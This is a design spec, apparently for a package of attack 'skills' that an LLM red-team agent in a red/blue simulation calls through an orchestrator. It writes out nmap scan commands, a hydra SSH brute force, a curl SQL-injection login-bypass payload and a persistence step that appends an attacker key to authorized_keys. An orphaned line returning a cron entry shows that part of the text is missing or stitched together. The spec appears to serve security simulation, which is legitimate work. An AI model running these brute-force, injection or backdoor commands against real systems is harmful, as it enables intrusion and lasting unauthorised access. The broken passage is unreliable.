Create `skills/` package at project root (same level as `orchestrator/`, `agents/`).

**skills/registry.py:**
- Dict `SKILL_REGISTRY: dict[str, dict]` where each entry has keys: `name`, `description`, `parameters` (dict of param_name -> description string), `function` (callable), `role` ("red" or "blue").
- Function `get_skills_for_role(role: str) -> list[dict]` returns skill metadata (name, description, parameters) for the given role — used to build the LLM prompt's available skills list.
- Function `execute_skill(name: str, params: dict, orchestrator_url: str) -> dict` that looks up skill in registry and calls it, passing orchestrator_url so skills can POST to /execute. Returns structured dict with `success` bool and `result` dict.
- All skills execute commands by POSTing to the orchestrator /execute endpoint (not via direct SSH). Pass `agent_role`, `command`, `reasoning` (skill name + params), `turn_number=0` (placeholder, caller sets real value later).
- Import and register all red skills at module level.

**skills/red/recon.py:**
- `port_scan(target: str, orchestrator_url: str, agent_role: str = "red") -> dict`: POST `nmap -T4 -sT -sV --open -p 1-1000 {target}` to orchestrator /execute. Parse stdout for open ports (regex: lines matching `^\d+/tcp\s+open`). Return `{"target": target, "open_ports": [{"port": int, "service": str, "version": str}]}`. Use -sT (TCP connect) to avoid NET_ADMIN cap requirement.
- `service_enum(target: str, port: int, orchestrator_url: str, agent_role: str = "red") -> dict`: POST `nmap -sT -sV -sC -p {port} {target}` to orchestrator. Return `{"target": target, "port": port, "details": stdout_text}`.

**skills/red/exploit.py:**
- `ssh_brute(target: str, username: str, orchestrator_url: str, agent_role: str = "red", wordlist: str = "/usr/share/wordlists/rockyou.txt") -> dict`: POST `hydra -l {username} -P {wordlist} ssh://{target} -t 4 -f` to orchestrator with 120s timeout expectation. Parse stdout for `login:.*password:` regex. Return `{"success": bool, "credential": {"user": str, "password": str} | None}`.
- `web_sqli_check(url: str, orchestrator_url: str, agent_role: str = "red") -> dict`: POST `curl -s -o /dev/null -w '%{http_code}' '{url}' --data "username=admin' OR '1'='1&password=test"` to orchestrator. Return `{"url": url, "vulnerable": bool, "details": str}`. Check if response indicates SQLi (200 when invalid creds should give 401/403).

All skill functions use `requests.post(f"{orchestrator_url}/execute", json={...}, timeout=120)` and parse the ExecuteResponse JSON. Handle errors gracefully — return `{"success": False, "error": str}` on timeout/connection errors.

Return `{"success": bool, "cron_entry": str}`.
- `add_ssh_key(target_user: str, pubkey: str, orchestrator_url: str, agent_role: str = "red") -> dict`: POST `mkdir -p /home/{target_user}/.ssh && echo '{pubkey}' >> /home/{target_user}/.ssh/authorized_keys && chmod 600 /home/{target_user}/.ssh/authorized_keys` to orchestrator. Return `{"success": bool, "target_user": str}`.
